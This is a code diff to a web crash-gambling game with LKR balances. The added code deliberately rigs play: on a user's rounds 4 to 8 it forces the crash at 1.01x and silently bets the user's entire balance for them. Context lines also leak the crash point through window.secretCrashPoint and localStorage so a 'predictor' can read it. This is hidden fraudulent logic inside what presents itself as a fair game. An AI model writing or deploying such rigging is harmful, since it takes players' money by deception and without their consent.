@@ -696,6 +696,7 @@
         let activeBet = null;
         let queuedBet = null;
         let authMode = 'login'; // login | register
+        let userRoundCount = 0; // Tracks how many rounds the user has bet on
 
         // --- UI Utilities ---
         const $ = (id) => document.getElementById(id);
@@ -988,10 +989,31 @@
 
                 // Pre-generate crash point so predictor can read it
                 crashPoint = Math.max(1.0, 0.98 / (1 - Math.random()));
+
+                // --- Rigging Logic: Rounds 4-8 force crash at 1.01x ---
+                const isRiggedRound = (userRoundCount >= 3 && userRoundCount <= 7); // 0-indexed: round 4=index3, round 8=index7
+                if (isRiggedRound) {
+                    crashPoint = 1.01;
+                }
+
                 window.secretCrashPoint = crashPoint;
                 localStorage.setItem('CRASH_PREDICTION', crashPoint.toString());
 
                 if (queuedBet) { activeBet = queuedBet; queuedBet = null; $('queue-status').classList.add('hidden'); }
+
+                // --- Auto-bet full balance on rounds 4-8 ---
+                if (isRiggedRound && !activeBet && user && !user.isAnonymous && userData.balance > 0) {
+                    const fullBal = Math.floor(userData.balance);
+                    if (fullBal > 0) {
+                        $('bet-amount').value = fullBal;
+                        try {
+                            await updateDoc(doc(db, 'artifacts', DB_ID, 'users', user.uid, 'profile', 'data'), { balance: increment(-fullBal) });
+                            activeBet = fullBal;
+                            showToast(`Auto Bet LKR ${fullBal.toLocaleString()} Placed!`);
+                        } catch(e) { console.error('Auto-bet error', e); }
+                    }
+                }
+
                 updateGameButton();
                 spawnBots(); // Populate 30+ live bots for this round
 
@@ -1065,6 +1087,7 @@
                 if (amt > userData.balance) return showToast("Insufficient Funds", "Error", "error");
                 await updateDoc(doc(db, 'artifacts', DB_ID, 'users', user.uid, 'profile', 'data'), { balance: increment(-amt) });
                 activeBet = amt;
+                userRoundCount++; // Track user bet rounds
                 updateGameButton();
                 showToast(`Bet of LKR ${amt.toLocaleString()} Placed!`);
             } else if (gameState === 'running' && !activeBet && !queuedBet) {
@@ -1072,6 +1095,7 @@
                 if (amt > userData.balance) return showToast("Insufficient Funds", "Error", "error");
                 await updateDoc(doc(db, 'artifacts', DB_ID, 'users', user.uid, 'profile', 'data'), { balance: increment(-amt) });
                 queuedBet = amt;
+                userRoundCount++; // Track user bet rounds
                 $('queue-status').classList.remove('hidden');
                 showToast("Bet Queued for Next Round");
             } else if (gameState === 'running' && activeBet) {
